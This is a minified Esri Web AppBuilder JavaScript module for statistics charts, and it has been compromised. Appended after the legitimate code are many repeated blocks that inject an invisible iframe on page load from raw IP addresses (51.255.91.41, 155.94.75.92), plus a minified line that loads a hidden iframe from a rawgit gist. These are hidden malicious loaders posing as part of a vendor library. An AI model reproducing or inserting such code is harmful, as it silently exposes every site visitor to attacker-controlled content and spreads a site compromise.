// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/on dojo/_base/lang dojo/_base/Color dojo/Deferred esri/graphicsUtils esri/symbols/jsonUtils esri/layers/FeatureLayer esri/graphic jimu/utils jimu/clientStatisticsUtils".split(" "),function(u,v,w,g,l,x,y,n,q,z,r,p){return u([v],{postMixInProperties:function(){this.nls=window.jimuNls.statisticsChart},constructor:function(a){this.map=a.map},getChartOption:function(a,b){var c=this.getClientStatisticsData(a);this.bindChartEvent(b,a,c,!1);return this.getChartOptionWithData(a,
c)},getChartOptionForServer:function(a,b){var c=this.getClientStatisticsData(a,!0);this.bindChartEvent(b,a,c,!1);return this.getChartOptionWithData(a,c)},getLoadedLayer:function(a){return this._getLoadedLayer(a)},getClientStatisticsData:function(a,b){var c=a.chartConfig,d=c.mode;b={forServer:b,layerDefinition:a.featureLayer,features:a.features};"undefined"!==typeof a.popupFieldInfosObj&&(b.popupFieldInfosObj=a.popupFieldInfosObj);"undefined"!==typeof c.labelField&&(b.labelField=c.labelField);"undefined"!==
typeof c.categoryField&&(b.categoryField=c.categoryField);c.valueFields&&"undefined"!==typeof c.valueFields&&(b.valueFields=c.valueFields);"undefined"!==typeof c.operation&&(b.operation=c.operation);"undefined"!==typeof c.sortOrder&&(b.sortOrder=c.sortOrder);"undefined"!==typeof c.dateConfig&&(b.dateConfig=c.dateConfig);"undefined"!==typeof c.nullValue&&(b.nullValue=c.nullValue);"undefined"!==typeof c.maxLabels&&(b.maxLabels=c.maxLabels);"undefined"!==typeof c.splitField&&(b.splitField=c.splitField);
if("feature"===d)return p.getFeatureModeStatisticsInfo(b);if("category"===d)return p.getCategoryModeStatisticsInfo(b);if("count"===d)return p.getCountModeStatisticsInfo(b);if("field"===d)return p.getFieldModeStatisticsInfo(b)},getChartOptionWithData:function(a,b){if(a.features){a.features=a.features.filter(g.hitch(this,function(a){return!!a.attributes}));var c=a.chartConfig,d=c.type;c.backgroundColor||(c.backgroundColor="transparent");c.hasOwnProperty("showLegend")||(c.showLegend=!1);c.legendTextColor||
(c.legendTextColor=this.fontColor);"pie"===d?(c.hasOwnProperty("showDataLabel")||(c.showDataLabel=!0),c.dataLabelColor||(c.dataLabelColor=this.fontColor)):(c.hasOwnProperty("showHorizontalAxis")||(c.showHorizontalAxis=!0),c.horizontalAxisTextColor||(c.horizontalAxisTextColor=this.fontColor),c.hasOwnProperty("showVerticalAxis")||(c.showVerticalAxis=!0),c.verticalAxisTextColor||(c.verticalAxisTextColor=this.fontColor))}this.popupFieldInfosObj=a.popupFieldInfosObj?a.popupFieldInfosObj:{};this.featureLayer=
a.featureLayer;this.features=a.features;b=this._createChartSeries(a,b);return this._mapSettingConfigToChartOption(b,a)},bindChartEvent:function(a,b,c,d){b=b.chartConfig;this.highLightColor=b.highLightColor||"#00ffff";var e=b.mode;if(this.map&&0!==c.length){b=g.hitch(this,function(a){if("series"===a.componentType){var b=null;if("field"===e)b=this.features;else{var h=c[a.dataIndex];h&&(b=h.dataFeatures)}b&&("mouseover"===a.type?this._mouseOverChartItem(b):"mouseout"===a.type?this._mouseOutChartItem(b):
"click"===a.type&&d&&this._zoomToGraphics(b))}});var f=[{name:"mouseover",callback:b},{name:"mouseout",callback:b}];d&&f.push({name:"click",callback:b});f.forEach(g.hitch(this,function(b){a.chart.on(b.name,b.callback)}))}},mockFeatureLayerAndChartConfigValueFieldsForServer:function(a){var b=a.statisticsFeatures,c=a.config;a=a.dataSchema.fields;var d={type:"Table",fields:[]},e=g.clone(c),f=c.mode;"category"===f?(e.valueFields=[],d.fields=c.valueFields.map(g.hitch(this,function(a){var b=c.operation;
"average"===b&&(b="avg");var d=a+"_"+b,b=a+"_"+b;e.valueFields.push(a);return{name:d,type:"esriFieldTypeDouble",alias:b}})),a.some(g.hitch(this,function(a){return a.name===c.categoryField?(d.fields.push(a),!0):!1}))):"count"===f?(this._mockModeForServer=!0,e.mode="feature",e.labelField=c.categoryField,e.valueFields=["count"],a.some(g.hitch(this,function(a){return a.name===c.categoryField?(d.fields.push(a),!0):!1})),d.fields.push({name:"count",type:"esriFieldTypeInteger",alias:this.nls.count})):"field"===
f&&(e.valueFields=[],d.fields=c.valueFields.map(g.hitch(this,function(a){var b=c.operation;"average"===b&&(b="avg");var d=a+"_"+b,b=a+"_"+b;e.valueFields.push(a);return{name:d,type:"esriFieldTypeDouble",alias:b}})));return this._getLoadedLayer(d).then(g.hitch(this,function(a){return{featureLayer:a,features:b,chartConfig:e}}))},_getLoadedLayer:function(a){var b=new x,c=null,c="string"===typeof a?new q(a):"esri.layers.FeatureLayer"===a.declaredClass?a:new q({layerDefinition:g.clone(a),featureSet:null});
c.loaded?b.resolve(c):this.own(w(c,"load",g.hitch(this,function(){b.resolve(c)})));return b},_createChartSeries:function(a,b){var c=a.chartConfig.mode;return"feature"===c||"category"===c?this._getCategoryModeChartOptionsByStatisticsInfo(a,b):"count"===c?this._getCountModeChartOptionsByStatisticsInfo(a,b):"field"===c?this._getFieldModeChartOptionByStatisticsInfo(a,b):null},_mapSettingConfigToChartOption:function(a,b,c){var d=b.chartConfig,e=d.type;b=d.mode;c={type:e,dataZoom:["inside","slider"],confine:!0,
backgroundColor:d.backgroundColor,legend:d.showLegend,theme:c||"light",advanceOption:function(a){d.showLegend&&a.legend&&(a.legend.textStyle||(a.legend.textStyle={}),a.legend.textStyle.color=d.legendTextColor,a.legend.textStyle.fontSize=d.legendTextSize);"pie"===e?a.series&&0<a.series.length&&a.series.forEach(g.hitch(this,function(a){"pie"===a.type&&(a.label||(a.label={}),a.label.normal||(a.label.normal={}),a.label.normal.show=d.showDataLabel,a.label.normal.textStyle||(a.label.normal.textStyle={}),
a.label.normal.textStyle.color=d.dataLabelColor,a.label.normal.textStyle.fontSize=d.dataLabelSize)})):(a.xAxis||(a.xAxis={}),a.xAxis.axisLabel||(a.xAxis.axisLabel={}),a.xAxis.axisLabel.textStyle||(a.xAxis.axisLabel.textStyle={}),a.xAxis.axisLabel.textStyle.color=d.horizontalAxisTextColor,a.xAxis.axisLabel.textStyle.fontSize=d.horizontalAxisTextSize,a.yAxis||(a.yAxis={}),a.yAxis.axisLabel||(a.yAxis.axisLabel={}),a.yAxis.axisLabel.textStyle||(a.yAxis.axisLabel.textStyle={}),a.yAxis.axisLabel.textStyle.color=
d.verticalAxisTextColor,a.yAxis.axisLabel.textStyle.fontSize=d.verticalAxisTextSize)}};if("pie"===e&&"field"!==b&&(b=d.seriesStyle)&&b.styles&&b.styles[0]&&(b=b.styles[0].style)&&Array.isArray(b.color)){var f=g.clone(b.color);2===f.length&&(f=this._getColors(g.clone(b.color),6));c.color=f}"pie"===e&&(c.innerRadius=d.innerRadius,c.labelLine=!!d.showDataLabel);-1<["column","bar","line"].indexOf(e)&&(d.stack||(d.stack=!1),"line"!==e||d.area||(d.area=!1),"line"===e&&(c.area=d.area),"column"===e||"bar"===
e||"line"===e&&d.area)&&(c.stack=d.stack);g.mixin(a,c);"pie"!==e&&(a.axisPointer=!0,a.scale=!1,a.hidexAxis=!d.showHorizontalAxis,a.hideyAxis=!d.showVerticalAxis);return a},_getColors:function(a,b){var c=[];if(2===a.length)c=this._createGradientColors(a[0],a[a.length-1],b);else{for(var d=Math.ceil(b/a.length),e=0;e<d;e++)c=c.concat(a);c=c.slice(0,b)}return c},_createGradientColors:function(a,b,c){var d=[];a=new l(a);var e=new l(b);b=(e.r-a.r)/c;for(var f=(e.g-a.g)/c,e=(e.b-a.b)/c,h=new l,k=0,g=0,t=
0,m=0;m<c;m++)k=parseInt(a.r+b*m,10),g=parseInt(a.g+f*m,10),t=parseInt(a.b+e*m,10),h.setColor([k,g,t]),d.push(h.toHex());return d},_getFieldModeChartOptionByStatisticsInfo:function(a,b){var c=a.chartConfig,d=c.type,e=a.featureLayerForChartSymbologyChart,f={type:d,labels:[],series:[{type:d,data:[]}]};b.forEach(g.hitch(this,function(a){var b=a.label,d=this._getFieldAlias(a.label),g=a.value;f.labels.push(d);a=this._getSerieDataItem({item:a,value:g,label:d,_originLabel:b},c,e);f.series[0].data.push(a)}));
f.series=this._assignColorsToSeries(c,f.series);return f},_getCountModeChartOptionsByStatisticsInfo:function(a,b){var c=a.chartConfig,d=c.type,e=a.featureLayerForChartSymbologyChart,f=!1;0<b.length&&(f=b.every(function(a){return!!a.splitedValueFields}));if(f)return this._getSplitedSeriesForCategoryOrCountMode(b,a,c);var h={type:d,labels:[],series:[{type:d,data:[]}]};b.forEach(g.hitch(this,function(a){var b=a.count,d=a.fieldValue,f=a.originValue;h.labels.push(d);a=this._getSerieDataItem({item:a,value:b,
label:d,_originLabel:f},c,e);h.series[0].data.push(a)}));h.series=this._assignColorsToSeries(c,h.series);return h},_getCategoryModeChartOptionsByStatisticsInfo:function(a,b){var c=a.chartConfig,d=c.type,e=this._getFieldAliasObjactArray(c.valueFields),f=null,h=a.featureLayerForChartSymbologyChart,k=!1;0<b.length&&(k=b.every(function(a){return!!a.splitedValueFields}));if(k)return this._getSplitedSeriesForCategoryOrCountMode(b,a,c);if("radar"===d)return a=e.map(function(a){return{name:a.alias}}),b=this._getSeriesOfRadar(b),
f={type:d,indicator:a,series:b};f={type:d,labels:[],series:[]};f.series=e.map(g.hitch(this,function(a){return{name:a.alias,_originName:a.name,type:d,data:[]}}));b.forEach(g.hitch(this,function(a){var b=a.category,d=a.originValue;f.labels.push(b);for(var e=0;e<a.valueFields.length;e++){var g=this._getSerieDataItem({item:a,value:a.valueFields[e],label:b,_originLabel:d},c,h);f.series[e].data.push(g)}}));f.series=this._assignColorsToSeries(c,f.series);return f},_getMatchingStyle:function(a,b){var c=null;
b=b.styles;if(!b||!b[0]||""===a)return c;b.forEach(function(b){b.name===a&&(c=b.style)});return c},_setStyleToSerieDataItem:function(a,b){b.itemStyle||(b.itemStyle={});b.itemStyle.normal||(b.itemStyle.normal={});a&&"undefined"!==typeof a.color&&(Array.isArray(a.color)?b.itemStyle.normal.color=a.color[0]:b.itemStyle.normal.color=a.color);a&&"undefined"!==typeof a.opacity&&(b.itemStyle.normal.opacity=1-parseFloat(a.opacity/10));return b},_setStyleToSerie:function(a,b,c){b.itemStyle||(b.itemStyle={});
b.itemStyle.normal||(b.itemStyle.normal={});a&&"undefined"!==typeof a.color&&(Array.isArray(a.color)?b.itemStyle.normal.color=a.color[0]:b.itemStyle.normal.color=a.color);a&&"undefined"!==typeof a.opacity&&(c?(b.areaStyle||(b.areaStyle={}),b.areaStyle.normal||(b.areaStyle.normal={}),b.areaStyle.normal.opacity=1-parseFloat(a.opacity/10)):b.itemStyle.normal.opacity=1-parseFloat(a.opacity/10));return b},_assignColorsToSeries:function(a,b){var c=a.seriesStyle;if(!c||!c.styles||!c.styles[0])return b;var d=
a.mode;this._mockModeForServer&&"feature"===d&&(d="count",this._mockModeForServer=!1);var e=a.area;return b.map(function(a){var b=null,f=a.type;if("field"===d)"line"===f?(b=c.styles[0].style,a=this._setStyleToSerie(b,a,e)):(f=a.data)&&f[0]&&(a.data=f.map(function(a){b=this._getMatchingStyle(a._originName,c);return this._setStyleToSerieDataItem(b,a)}.bind(this)));else if("column"===f||"bar"===f||"line"===f)"count"===d?(b=c.styles[0].style,a=this._setStyleToSerie(b,a,e)):"undefined"!==typeof a.name&&
(b=this._getMatchingStyle(a._originName,c))&&(a=this._setStyleToSerie(b,a,e));return a}.bind(this))},_getSplitedSeriesForCategoryOrCountMode:function(a,b,c){var d=c.type,e=b.featureLayerForChartSymbologyChart,f={type:d,labels:[],series:[]},h=[];a.forEach(function(a){if(a=a.splitedValueFields)a=a.map(function(a){return{field:a.field,originField:a.originField}}),h=h.concat(a)});b=this._removeDuplicateElementForObjArray(h);f.series=b.map(g.hitch(this,function(b){for(var c=[],e=0;e<a.length;e++)c[e]=
null;return{name:b.field,_originName:b.originField,type:d,data:c}}));a.forEach(g.hitch(this,function(a,b){var d="";a.category?d=a.category:a.fieldValue&&(d=a.fieldValue);var g=a.originValue;f.labels.push(d);a.splitedValueFields.forEach(function(h){f.series.forEach(function(f){if(f._originName===h.originField){var k=this._getSerieDataItem({item:a,value:h.value,label:d,_originLabel:g},c,e);f.data[b]=k}}.bind(this))}.bind(this))}));return f},_getSeriesOfRadar:function(a){a=a.map(function(a){return{name:a.category,
value:a.valueFields}});return[{type:"radar",data:a}]},_getSerieDataItem:function(a,b,c){var d=a.item,e=a.label,f=a.value;a=a._originLabel;var g=!1;if(b=b.seriesStyle)g=b.useLayerSymbology;var k;g&&(k=this._getSymbolColorForDataItem(c,d.dataFeatures));c={};c.name=e;c.value=f;c._originName=a;k&&(c.itemStyle={normal:{color:k},emphasis:{color:k}});return c},_getSymbolColorForDataItem:function(a,b){var c=!1;if(!a)return c;b=b[0];return b?c=this._getColorForFeature(a.renderer,b):c},_getColorForFeature:function(a,
b){var c=!1,d=this._getVisualVariableByType("colorInfo",a.visualVariables);d?(a=a.getColor(b,{colorInfo:d}))&&(c=this._convertToEchartsRbga(a)):(a=a.getSymbol(b))&&"undefined"!==typeof a.color&&(c=this._convertToEchartsRbga(a.color));return c},_convertToEchartsRbga:function(a){if(!a||"undefined"===typeof a.r)return a;a=JSON.parse(JSON.stringify(a));var b;b="rgba("+(a.r+",");b+=a.g+",";b+=a.b+",";return b+=a.a+")"},_getVisualVariableByType:function(a,b){return b&&(b=b.filter(function(b){return b.type===
a&&!b.target}),b.length)?b[0]:null},_mouseOverChartItem:function(a){this._removeTempGraphics();this._mouseOutChartItem(a);a.forEach(g.hitch(this,function(a){a._originalSymbol=a.symbol}));if(this.featureLayer&&this.featureLayer.getMap()&&this.featureLayer.visible){var b=r.getTypeByGeometryType(this.featureLayer.geometryType),c=null;if("point"===b)c=this._getHighLightMarkerSymbol(),this.tempGraphics=[],a.forEach(g.hitch(this,function(a){a=new z(a.geometry,c);this.tempGraphics.push(a);this.featureLayer.add(a)}));
else if("polyline"===b)c=this._getHighLightLineSymbol(this.highLightColor),a.forEach(g.hitch(this,function(a){a.setSymbol(c)}));else if("polygon"===b){var d=this.featureLayer.getSelectedFeatures()||[];a.forEach(g.hitch(this,function(a){var b=0<=d.indexOf(a),b=this._getHighLightFillSymbol(this.featureLayer,a,b);a.setSymbol(b)}));this.features.length!==a.length&&"polygon"===b&&(a.forEach(g.hitch(this,function(a){this.featureLayer.remove(a)})),a.forEach(g.hitch(this,function(a){this.featureLayer.add(a)})))}}},
_mouseOutChartItem:function(a){this._removeTempGraphics();a.forEach(g.hitch(this,function(a){a.setSymbol(a._originalSymbol||null)}))},_removeTempGraphics:function(){if(this.featureLayer&&this.tempGraphics&&0<this.tempGraphics.length)for(;0<this.tempGraphics.length;)this.featureLayer.remove(this.tempGraphics[0]),this.tempGraphics.splice(0,1);this.tempGraphics=null},_zoomToGraphics:function(a){if(this.map&&this.featureLayer&&this.featureLayer.visible&&a&&0<a.length){var b=null;try{var c=a.filter(function(a){return!!a.geometry});
0<c.length&&(b=y.graphicsExtent(c))}catch(d){console.error(d)}if(b)this.map.setExtent(b.expand(1.4));else if(a=(a=a[0])&&a.geometry)b=g.hitch(this,function(a){var b=this.map.getNumLevels(),c=this.map.getLevel();this.map.setLevel(Math.max(c,Math.floor(2*b/3))).then(g.hitch(this,function(){this.map.centerAt(a)}))}),"point"===a.type?b(a):"multipoint"===a.type&&1===a.points.length&&b(a.getPoint(0))}},_isNumberField:function(a){var b=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle",
"esriFieldTypeDouble"];return this.featureLayer.fields.some(g.hitch(this,function(c){return c.name===a&&0<=b.indexOf(c.type)}))},_getHighLightMarkerSymbol:function(){var a=n.fromJson({color:[255,255,255,0],size:18,angle:0,xoffset:0,yoffset:0,type:"esriSMS",style:"esriSMSSquare",outline:{color:[0,0,128,255],width:.75,type:"esriSLS",style:"esriSLSSolid"}});a.setSize(30);a.outline.setColor(new l(this.highLightColor));return a},_getHighLightLineSymbol:function(a){var b=n.fromJson({color:[0,255,255,255],
width:1.5,type:"esriSLS",style:"esriSLSSolid"});b.setColor(new l(a||this.highLightColor));return b},_getDefaultHighLightFillSymbol:function(){var a=n.fromJson({color:[0,255,255,128],outline:{color:[0,255,255,255],width:1.5,type:"esriSLS",style:"esriSLSSolid"},type:"esriSFS",style:"esriSFSSolid"});a.outline.setColor(new l(this.highLightColor));return a},_getSymbolByRenderer:function(a,b){var c=this._getDefaultHighLightFillSymbol(),d=this._getVisualVariableByType("colorInfo",a.visualVariables);if(d){if(a=
a.getColor(b,{colorInfo:d}))a=g.clone(a),c.setColor(a)}else c=a.getSymbol(b);return c},_getHighLightFillSymbol:function(a,b,c){var d=null,e=b.symbol,d=a.renderer;!e&&d&&(e=this._getSymbolByRenderer(d,b));e&&"function"===typeof e.setOutline?(d=n.fromJson(e.toJson()),b=1.5,e.outline&&0<e.outline.width&&(b=e.outline.width+1),c=this._getHighLightLineSymbol(c?"#ff0000":"#00ffff"),c.setWidth(b),d.setOutline(c)):d=this._getDefaultHighLightFillSymbol();return d},_getFieldAliasArray:function(a){return a.map(g.hitch(this,
function(a){return this._getFieldAlias(a)}))},_getFieldAliasObjactArray:function(a){return a.map(g.hitch(this,function(a){return{name:a,alias:this._getFieldAlias(a)}}))},_getFieldAlias:function(a){var b=a;(a=this._getFieldInfo(a))&&(b=a.alias||b);return b},_getFieldInfo:function(a){if(this.featureLayer)for(var b=this.featureLayer.fields,c=0;c<b.length;c++)if(b[c].name===a)return b[c];return null},_removeDuplicateElementForObjArray:function(a){if(!Array.isArray(a))return a;var b=[];b.push(a[0]);a.forEach(function(a){b.some(function(b){return r.isEqual(b,
a)})||b.push(a)});return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});